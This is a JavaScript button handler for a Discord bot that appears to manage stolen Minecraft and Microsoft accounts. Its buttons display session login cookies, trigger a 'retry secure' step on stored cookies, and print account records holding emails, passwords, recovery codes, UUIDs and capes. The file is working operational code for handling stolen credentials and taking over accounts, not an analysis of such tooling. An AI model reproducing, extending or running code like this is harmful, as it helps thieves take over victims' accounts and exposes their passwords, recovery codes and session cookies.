const getButtons = require("../../utils/getButtons");
const { queryParams } = require("../../../db/db");
const cliColor = require("cli-color");

module.exports = async (client, interaction) => {
  if (!interaction.isButton()) return;
  const Buttons = getButtons(__dirname);

  try {
    // 👉 Legacy getcookie|cookie_string
    if (interaction.customId.startsWith("getcookie|")) {
      const host = interaction.customId.split("|")[1];
      return interaction.reply({
        content: `**Here is the Cookie Login:**\n\`\`\`${host}\`\`\``,
        ephemeral: true
      });
    }

    let button = Buttons.find((btn) => btn.name === interaction.customId.split("|")[0]);

    // 👉 DB-based action
    if (interaction.customId.startsWith("action|")) {
      const actionId = interaction.customId.split("|")[1];
      const actionData = await queryParams(`SELECT * FROM actions WHERE id = ?`, [actionId]);

      if (actionData.length === 0) {
        return interaction.reply({
          embeds: [{
            title: `Error :x:`,
            description: `Please try again later!`,
            color: 0xff0000,
          }],
          ephemeral: true,
        });
      }

      const [cmd, data] = actionData[0].action.split("|");

      // 👉 Send cookie
      if (cmd === "sendcookie") {
        return interaction.reply({
          content: `🔐 **Here is the Cookie Login:**\n\`\`\`${data}\`\`\``,
          ephemeral: true
        });
      }

      // 👉 Retry secure with cookie ID
      if (cmd === "retrysecure") {
        const cookieId = data;
        const result = await queryParams(`SELECT cookie FROM cookie_store WHERE id = ?`, [cookieId]);

        if (result.length === 0) {
          return interaction.reply({ content: `❌ Cookie not found`, ephemeral: true });
        }

        const cookie = result[0].cookie;

        return interaction.reply({
          content: `🔁 Retrying secure with cookie...\n\`\`\`${cookie.slice(0, 100)}...\`\`\``,
          ephemeral: true
        });
      }

      // 👉 Copy account data (Copy Text button)
      if (cmd === "copytext") {
        const accountId = data;
        const result = await queryParams(`SELECT * FROM accountsbyuser WHERE id = ?`, [accountId]);

        if (!result.length) {
          return interaction.reply({
            content: `❌ Account not found.`,
            ephemeral: true
          });
        }

        const d = result[0];

        const text =
`Email: ${d.email || "N/A"}
Security Email: ${d.security_email || "N/A"}
Password: ${d.password || "N/A"}
Recovery Code: ${d.recovery_code || "N/A"}
Minecraft IGN: ${d.old_mcname || "N/A"}
UUID: ${d.uuid || "Unknown"}
Method: ${d.method || "Unknown"}
Capes: ${d.capes || "Unknown"}`;

        return interaction.reply({
          content: `\n\`\`\`\n${text}\n\`\`\``,
          ephemeral: true
        });
      }

      // 👉 Fallback to regular button logic
      interaction.customId = actionData[0].action;
      button = Buttons.find((btn) => btn.name === interaction.customId.split("|")[0]);
    }

    if (!button) return;

    // 👉 ownerOnly check
    if (button.ownerOnly && interaction.user.id !== client.username) {
      return interaction.reply({
        content: `Invalid permissions!`,
        ephemeral: true
      });
    }

    // 👉 adminOnly check
    if (button.adminOnly) {
      const users = await queryParams(
        `SELECT * FROM users WHERE user_id = ? AND child = ?`,
        [client.username, interaction.user.id]
      );
      if ((users.length === 0 || !users[0]?.admin) && interaction.user.id !== client.username) {
        return interaction.reply({
          content: `Invalid permissions!`,
          ephemeral: true
        });
      }
    }

    // 👉 userOnly check
    if (button.userOnly) {
      const users = await queryParams(
        `SELECT * FROM users WHERE user_id = ? AND child = ?`,
        [client.username, interaction.user.id]
      );
      if (users.length === 0 && interaction.user.id !== client.username) {
        return interaction.reply({
          content: `You don't have access to this bot!`,
          ephemeral: true
        });
      }
    }

    console.log(`B] ${cliColor.yellow(button.name)} ${cliColor.blue(interaction.user.username)} ${cliColor.red(interaction.customId)}`);
    await button.callback(client, interaction);

  } catch (e) {
    console.log("❌ Error in buttons.js:", e);
  }
};
